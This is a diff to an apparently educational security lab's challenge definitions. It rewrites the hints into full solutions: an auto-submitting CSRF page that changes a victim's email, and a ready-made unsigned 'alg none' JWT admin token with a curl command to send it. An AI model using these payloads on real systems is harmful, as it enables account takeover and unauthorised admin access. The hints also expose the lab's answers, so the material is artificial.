@@ -19,6 +19,9 @@ class Challenge:
     hints: tuple[str, str, str]
 
 
+# {"alg":"none"} . {"sub":"alice","role":"admin"} . no signature: the answer to the JWT challenge
+UNSIGNED_ADMIN_TOKEN = "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9."
+
 CHALLENGES = [
     Challenge(
         id="sqli",
@@ -185,7 +188,11 @@ CHALLENGES = [
             " <code>python3 -m http.server 8001 --bind 127.0.0.1</code>, then open it at"
             " <code>http://127.0.0.1:8001/</code> in the browser where you are signed in. Use the same host name"
             " (127.0.0.1 or localhost) you use for the lab.",
-            "Make it fire by itself: <code>&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;</code>."
+            "Make it fire by itself. The whole attacker page, to save as <code>index.html</code> in the folder you"
+            " serve: <code>&lt;form method=&quot;post&quot; action=&quot;ORIGIN/account&quot;&gt;&lt;input"
+            " name=&quot;display_name&quot; value=&quot;Alice&quot;&gt;&lt;input name=&quot;email&quot;"
+            " value=&quot;mallory@evil.test&quot;&gt;&lt;/form&gt;"
+            "&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code>"
             " The lab captures the flag when the email changes through a request whose"
             " <code>Origin</code> header is not this app.",
         ),
@@ -211,8 +218,10 @@ CHALLENGES = [
             " with an empty signature. Or the HS256 secret is a common word: the repository ships"
             " <code>breachlab/wordlists/jwt-secrets.txt</code>.",
             "Unsigned token: base64url of <code>{&quot;alg&quot;:&quot;none&quot;}</code>, a dot, base64url of"
-            " <code>{&quot;sub&quot;:&quot;alice&quot;,&quot;role&quot;:&quot;admin&quot;}</code>, and a trailing dot."
-            " Send it with <code>curl -H 'Authorization: Bearer …' ORIGIN/api/admin/report</code>.",
+            " <code>{&quot;sub&quot;:&quot;alice&quot;,&quot;role&quot;:&quot;admin&quot;}</code>, and a trailing dot,"
+            f" which makes <code>{UNSIGNED_ADMIN_TOKEN}</code>"
+            f" Send it with <code>curl -H 'Authorization: Bearer {UNSIGNED_ADMIN_TOKEN}'"
+            " ORIGIN/api/admin/report</code>",
         ),
     ),
     Challenge(
